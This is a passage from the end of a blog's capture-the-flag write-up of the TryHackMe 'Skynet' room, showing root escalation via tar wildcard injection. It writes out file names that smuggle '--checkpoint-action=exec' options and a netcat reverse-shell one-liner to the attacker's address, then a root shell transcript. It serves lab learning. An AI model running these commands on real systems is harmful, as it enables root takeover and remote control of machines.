+touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint-action=exec=sh shell.sh&#34;</span>
+touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint=1&#34;</span>
+</code></pre></div><p>So running these commands we leverage tar&rsquo;s checkpoints and we can execute arbitrary code as root. Sweet!
+Let&rsquo;s try it out!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ cd /var/www/html
+$ ls
+--checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>sh shell.sh
+--checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+45kra24zxs28v3yd
+admin
+ai
+config
+css
+image.png
+index.html
+js
+style.css
+$ echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2113 &gt;/tmp/f&#34;</span> &gt; shell.sh
+$ touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint-action=exec=sh shell.sh&#34;</span>
+$ touch <span style="color:#e6db74">&#34;/var/www/html/--checkpoint=1&#34;</span>
+
+</code></pre></div><p>and we get our root shell!!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/privilege-escalation-awesome-scripts-suite/linPEAS<span style="color:#f92672">]</span>
+└─$ nc -nlvp <span style="color:#ae81ff">2113</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2113</span> ...
+connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.136.30<span style="color:#f92672">]</span> <span style="color:#ae81ff">54234</span>
+/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+<span style="color:#75715e"># whoami</span>
+root
+<span style="color:#75715e"># cat /root/root.txt</span>
+<span style="color:#f92672">{</span>ROOT_FLAG_REDACTED<span style="color:#f92672">}</span>
+# 
+
+</code></pre></div><p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+<div class="container" style="margin:10px !important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+</div>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+        <p>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon">
+            <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path>
+            <line x1="7" y1="7" x2="7" y2="7"></line>
+          </svg><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/hacking/">hacking</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/tryhackme/">tryHackme</a></span><span class="tag"><a href="https://tzero86-bits.netlify.app/tags/writeups/">writeups</a></span>
+        </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        5233 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        2020-08-25 20:59 -0400
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Skynet_writeup.sh&amp;caption=Skynet_writeup.sh&amp;canonicalUrl=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=Skynet_writeup.sh&amp;body=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f&amp;media=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f;description=Skynet_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f&amp;title=Skynet_writeup.sh&amp;summary=Skynet_writeup.sh&amp;source=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f&amp;resubmit=true&amp;title=Skynet_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f;title=Skynet_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Skynet_writeup.sh%20https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f&amp;t=Skynet_writeup.sh" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Skynet_writeup.sh&amp;url=https%3a%2f%2ftzero86-bits.netlify.app%2fposts%2fskynet_writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://tzero86-bits.netlify.app/posts/hydra_writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Hydra_writeup.sh</span>
+              </a>
+            </span>
+          
+
+          
+            <span class="button next">
+              <a href="https://tzero86-bits.netlify.app/posts/gamezone_writeup/">
+                <span class="button__text">GameZone_writeup.sh</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+    
+
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            <span> <a href="https://tzero86-bits.netlify.app/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+    </body>
+</html>
